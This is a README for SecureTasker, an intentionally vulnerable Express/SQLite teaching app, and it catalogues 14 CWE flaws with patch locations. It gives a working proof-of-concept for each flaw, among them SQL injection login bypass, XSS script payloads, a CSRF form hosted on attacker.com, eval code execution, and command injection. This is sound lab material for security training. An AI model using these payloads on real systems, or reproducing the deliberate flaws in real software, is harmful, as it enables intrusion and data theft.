# 🔒 SecureTasker

> **Intentionally vulnerable** task-management app built for the  
> Secure Software Development (SSD) Lab — Capstone Exercise.

SecureTasker ships with **14 catalogued vulnerabilities** in their
**vulnerable form by default**. Each one has a commented-out **PATCHED**
block directly below it. Students uncomment the patch, re-run, and verify
the fix with the PoC listed here.

---

## Quick Start

```bash
npm install          # installs all deps (including vulnerable lodash)
npm run seed         # creates securetasker.db with demo data
npm start            # starts Express on http://localhost:3000
```

### Demo Credentials

| User    | Password      |
|---------|---------------|
| `alice` | `password123` |
| `bob`   | `letmein456`  |

---

## Project Structure

```
SecureTasker/
├── package.json          # CWE-1104 — vulnerable lodash pin
├── server.js             # CWE-614, CWE-209
├── db.js                 # SQLite schema
├── seed.js               # Demo data
├── routes/
│   ├── auth.js           # CWE-89, CWE-256, CWE-20, CERT-LOG
│   ├── tasks.js          # CWE-639, CWE-352, CWE-908
│   └── admin.js          # CWE-78, CWE-502
├── views/
│   ├── login.ejs
│   ├── register.ejs
│   ├── tasks.ejs         # CWE-79 (stored)
│   ├── task.ejs          # CWE-79 (stored)
│   ├── search.ejs        # CWE-79 (reflected)
│   ├── admin.ejs
│   └── error.ejs
├── public/
│   └── style.css
└── uploads/              # created at runtime by multer
```

---

## Vulnerability Map

| # | CWE | Vulnerability | Route | Source File | Patch Location |
|---|-----|---------------|-------|-------------|----------------|
| 1 | CWE-89 | SQL Injection | `POST /login` | `routes/auth.js` | Same file, below the `db.prepare(query)` call |
| 2 | CWE-79 | Stored XSS (title/desc) | `GET /tasks`, `GET /task/:id` | `views/tasks.ejs`, `views/task.ejs` | HTML comment below each `<%-` tag |
| 3 | CWE-79 | Reflected XSS (search) | `GET /search?q=` | `views/search.ejs` | HTML comment below the `<%- query %>` line |
| 4 | CWE-256 | Plaintext password storage | `POST /register` | `routes/auth.js` | Below the `INSERT` statement |
| 5 | CWE-639 | IDOR (no ownership check) | `GET /task/:id` | `routes/tasks.js` | Below the `SELECT * FROM tasks WHERE id = ?` line |
| 6 | CWE-209 | Verbose error / stack leak | All routes (on error) | `server.js` | Bottom of the file |
| 7 | CWE-614 | Insecure session cookie | All routes | `server.js` | Below the `express-session` config |
| 8 | CWE-352 | Missing CSRF on delete | `POST /task/:id/delete` | `routes/tasks.js` | Below the delete handler |
| 9 | CWE-502 | Insecure deserialization (eval) | `POST /import` | `routes/admin.js` | Below the `eval()` call |
| 10 | CWE-1104 | Vulnerable dependency (lodash) | N/A — SCA finding | `package.json` | Change `4.17.15` → `^4.17.21` |
| 11 | CWE-78 | Command injection (ping) | `POST /diagnostics/ping` | `routes/admin.js` | Below the `exec()` call |
| 12 | CWE-908 | Buffer.allocUnsafe memory leak | `POST /tasks` (with file) | `routes/tasks.js` | Below the `Buffer.allocUnsafe()` call |
| 13 | CERT-LOG | Insecure logging / no rate-limit | `POST /login` | `routes/auth.js` | Below the `console.log` line |
| 14 | CWE-20 | No input validation on register | `POST /register` | `routes/auth.js` | Below `const { username, password }` |

---

## Proof-of-Concept (PoC) for Each Vulnerability

### 1 · SQL Injection — CWE-89

```bash
# Bypass login as alice without knowing her password
curl -X POST http://localhost:3000/login \
  -d "username=alice' OR '1'='1' --&password=anything" \
  -c cookies.txt -L -v
```

---

### 2 · Stored XSS — CWE-79

```bash
# Create a task with a script payload (login first, reuse cookie)
curl -X POST http://localhost:3000/tasks \
  -b cookies.txt \
  -d "title=<script>alert('XSS')</script>&description=hello"
# Visit GET /tasks → the alert fires
```

---

### 3 · Reflected XSS — CWE-79

```
Open in browser:
  http://localhost:3000/search?q=<script>alert('Reflected')</script>
```

---

### 4 · Plaintext Password Storage — CWE-256

```bash
# Register, then inspect the database:
sqlite3 securetasker.db "SELECT username, password FROM users;"
# Passwords are in cleartext
```

---

### 5 · IDOR — CWE-639

```bash
# Login as bob, then access alice's task (id=1)
curl -b cookies_bob.txt http://localhost:3000/task/1
# Bob can see alice's task — no ownership check
```

---

### 6 · Verbose Error / Stack Leak — CWE-209

```bash
# Trigger a server error (e.g. malformed import)
curl -X POST http://localhost:3000/import \
  -b cookies.txt \
  -d "jsonData={invalid" -v
# If an uncaught exception occurs, full stack trace is in the HTML response
```

---

### 7 · Insecure Session Cookie — CWE-614

```
1. Login in browser
2. Open DevTools → Application → Cookies
3. Observe: connect.sid has no HttpOnly, no Secure, no SameSite flag
```

---

### 8 · Missing CSRF — CWE-352

```html
<!-- Host this on attacker.com; if victim is logged in, task 1 is deleted -->
<form method="POST" action="http://localhost:3000/task/1/delete" id="csrf">
</form>
<script>document.getElementById('csrf').submit();</script>
```

---

### 9 · Insecure Deserialization — CWE-502

```bash
# Execute arbitrary code via eval() in the import endpoint
curl -X POST http://localhost:3000/import \
  -b cookies.txt \
  -d 'jsonData=(function(){require("child_process").execSync("calc");})()'
```

---

### 10 · Vulnerable Dependency — CWE-1104

```bash
npm audit
# Reports prototype-pollution in lodash 4.17.15
# Fix: change version in package.json to "^4.17.21" and npm install
```

---

### 11 · Command Injection — CWE-78

```bash
curl -X POST http://localhost:3000/diagnostics/ping \
  -b cookies.txt \
  -d "host=127.0.0.1 & whoami"
# Server executes: ping -n 4 127.0.0.1 & whoami
```

---

### 12 · Buffer.allocUnsafe Memory Disclosure — CWE-908

```bash
curl -X POST http://localhost:3000/tasks \
  -b cookies.txt \
  -F "title=leak" \
  -F "description=test" \
  -F "thumbSize=4096" \
  -F "attachment=@somefile.txt"
# Check server console — thumbnail hex contains uninitialised memory bytes
```

---

### 13 · Insecure Logging — CERT-LOG

```bash
# Attempt login with wrong password
curl -X POST http://localhost:3000/login \
  -d "username=alice&password=SuperSecret!"
# Check server console output:
#   [LOGIN] user=alice password=SuperSecret!
# Password is logged in cleartext; no rate limiting on repeated failures
```

---

### 14 · No Input Validation — CWE-20

```bash
# Register with a 1-char username and empty-looking password
curl -X POST http://localhost:3000/register \
  -d "username=x&password=1"
# Succeeds — no length, complexity, or format validation
```

---

## Applying a Patch

Each vulnerability in the source code follows this pattern:

```js
// VULNERABLE: <CWE-id, one-line reason>
<vulnerable code>

/* PATCHED (uncomment to apply fix):
<patched code>
*/
```

**To apply a fix:**

1. Comment out or delete the `// VULNERABLE` line(s) and the vulnerable code.
2. Uncomment the `/* PATCHED … */` block.
3. Restart the server (`npm start`).
4. Re-run the PoC to verify the vulnerability is mitigated.

---

## Tool Compatibility

| Tool | What It Finds |
|------|---------------|
| **SonarQube** | SQL injection, XSS, eval(), command injection, insecure crypto |
| **Burp Suite** | XSS (stored & reflected), CSRF, IDOR, session flags |
| **npm audit / Snyk** | lodash 4.17.15 prototype-pollution |
| **OWASP ZAP** | XSS, injection, missing security headers |

---

## License

Educational use only. Do **not** deploy to production.
